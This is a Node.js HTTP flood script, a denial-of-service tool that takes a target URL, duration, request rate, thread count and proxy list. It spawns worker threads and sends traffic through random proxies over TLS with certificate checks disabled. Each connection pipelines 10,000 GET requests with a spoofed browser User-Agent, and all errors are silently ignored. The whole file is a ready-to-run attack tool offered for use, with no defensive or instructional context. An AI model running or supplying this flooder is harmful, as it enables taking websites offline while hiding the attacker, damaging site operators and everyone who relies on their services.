const https = require('https');
const fs = require('fs');
const { Worker, isMainThread, workerData } = require('worker_threads');
const { URL } = require('url');
const net = require('net');
const tls = require('tls');

if (isMainThread) {
    if (process.argv.length < 7) {
        console.error("Usage: node script.js <url> <time> <rps> <threads> <proxy.txt>");
        process.exit(1);
    }

    const target = {
        url: process.argv[2],
        time: parseInt(process.argv[3], 10),
        rps: parseInt(process.argv[4], 10),
        threads: parseInt(process.argv[5], 10),
        proxyFile: process.argv[6],
        requestsPerConnection: 10000 // Nilai sangat besar
    };

    console.log(`Starting attack on ${target.url} for ${target.time} seconds...`);
    const workers = [];
    for (let i = 0; i < target.threads; i++) {
        workers.push(new Worker(__filename, { workerData: target }));
    }
    workers.forEach(worker => worker.on('exit', () => console.log(`Worker exited.`)));
} else {
    const { url, time, rps, threads, proxyFile, requestsPerConnection } = workerData;
    const target = new URL(url);
    const PROXY_LIST = proxyFile ? fs.readFileSync(proxyFile, 'utf-8').split('\n').filter(p => p.trim()) : [];

    function sendRequest(proxy) {
        const [proxyHost, proxyPort] = proxy.split(':');
        const socket = net.connect(proxyPort, proxyHost, () => {
            const tlsConn = tls.connect({
                socket: socket,
                host: target.hostname,
                servername: target.hostname,
                rejectUnauthorized: false
            }, () => {
                const payload = `GET ${target.pathname} HTTP/1.1\r\n` +
                                `Host: ${target.hostname}\r\n` +
                                `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ` +
                                `(KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n` +
                                `Connection: keep-alive\r\n` +
                                `Accept: */*\r\n` +
                                `Accept-Encoding: gzip, deflate, br\r\n` +
                                `Accept-Language: en-US,en;q=0.9\r\n\r\n`;
                for (let i = 0; i < requestsPerConnection; i++) {
                    tlsConn.write(payload);
                }
            });
            tlsConn.on('error', () => {});
        });
        socket.on('error', () => {});
    }

    function startAttack() {
        const attackInterval = setInterval(() => {
            for (let i = 0; i < rps; i++) {
                if (PROXY_LIST.length > 0) {
                    const proxy = PROXY_LIST[Math.floor(Math.random() * PROXY_LIST.length)];
                    sendRequest(proxy);
                } else {
                    sendRequest("127.0.0.1:8080");
                }
            }
        }, 1000);
        setTimeout(() => clearInterval(attackInterval), time * 1000);
    }

    startAttack();
}
